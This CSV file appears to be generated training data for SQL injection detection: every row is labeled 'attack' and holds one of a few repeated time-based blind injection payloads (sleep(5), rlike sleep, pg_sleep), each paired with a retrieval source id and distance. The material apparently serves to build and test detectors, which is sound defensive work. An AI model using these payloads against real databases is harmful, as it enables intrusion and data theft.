id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000396,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.590392777067391
GAN_000397,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.575418290192194
GAN_000398,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.585138546043997
GAN_000399,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.600721085267244
GAN_000400,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000038,4.672819236508907
GAN_000401,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.623726262034733
GAN_000402,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.673315796920046
GAN_000403,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.5860832343775595
GAN_000404,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.578674981857315
GAN_000405,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.541390097527608
GAN_000406,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.49864803920332
GAN_000407,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.596296078256578
GAN_000408,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.6170576245597355
GAN_000409,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.535026977052295
GAN_000410,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.568960069077099
GAN_000411,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.528687588097032
GAN_000412,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.594952864415106
GAN_000413,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.637917415968686
GAN_000414,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.566860368791861
GAN_000415,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.51094715105918
GAN_000416,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.683065139112562
GAN_000417,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.619881124440953
GAN_000418,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.548031001868355
GAN_000419,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.72305775314733
GAN_000420,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.546612937046491
GAN_000421,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.709406733140377
GAN_000422,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.556298710234379
GAN_000423,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.526787478489119
GAN_000424,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.647930333570524
GAN_000425,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.625429514271966
GAN_000426,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.657335308502722
GAN_000427,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.611177226772414
GAN_000428,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.50655780687796
GAN_000429,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.52699713302404
GAN_000430,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.945833296476689
GAN_000431,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.585481574395069
GAN_000432,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.519085695438617
GAN_000433,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.575989649252222
GAN_000434,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.648767391483977
GAN_000435,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.517087024780019
GAN_000436,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.505683544274361
GAN_000437,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.449157517403655
GAN_000438,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.521653409203877
GAN_000439,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.70710716190565
GAN_000440,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.5630639166084475
GAN_000441,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.527892645002937
GAN_000442,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.679960525657185
GAN_000443,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.668824681381622
GAN_000444,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.564848197389187
GAN_000445,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.525203406310824
GAN_000446,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.581851499740594
GAN_000447,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.58769077366725
GAN_000448,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.548122245114309
GAN_000449,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.550432840293209
GAN_000450,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.655209742798001
GAN_000451,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.538439602915053
GAN_000452,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.513141625393179
GAN_000453,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.559588063565113
GAN_000454,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.710479024059791
GAN_000455,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.567713606656328
GAN_000456,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.639924731131677
GAN_000457,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.75819083094828
GAN_000458,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.549813927174437
GAN_000459,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.569661412666324
GAN_000460,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.5502646272846565
GAN_000461,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.464023585814048
GAN_000462,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.469930079987359
GAN_000463,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.61590878954885
GAN_000464,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.5632564697168245
GAN_000465,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.566193559090191
GAN_000466,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.596902140254761
GAN_000467,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.617223755283792
GAN_000468,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.660240882950529
GAN_000469,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.6051148403276
GAN_000470,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.584742862326102
GAN_000471,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.665997619655913
GAN_000472,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.536226122630117
GAN_000473,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.476800307845889
GAN_000474,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.580402462209623
GAN_000475,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.6736956353361085
GAN_000476,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.4618987126237
GAN_000477,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.685213945127749
GAN_000478,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.508609272566236
GAN_000479,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.673120820218238
GAN_000480,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.619018456195282
GAN_000481,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.6150987116712
GAN_000482,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.642358179291984
GAN_000483,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.5768077063951935
GAN_000484,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.5326998932540645
GAN_000485,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.558644446327452
GAN_000486,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.591258468202358
GAN_000487,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.598038137638379
GAN_000488,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.653116390986414
GAN_000489,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.6702522997159415
GAN_000490,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.7178262947076535
GAN_000491,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.647778641983231
GAN_000492,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.539237197914583
GAN_000493,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.665523983343531
GAN_000494,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.53662918461915
GAN_000495,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.62563260668619
GAN_000496,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.609658436609827
GAN_000497,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.596424686668247
GAN_000498,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.663233409877172
GAN_000499,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.560795185617452
GAN_000500,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.515569125195359
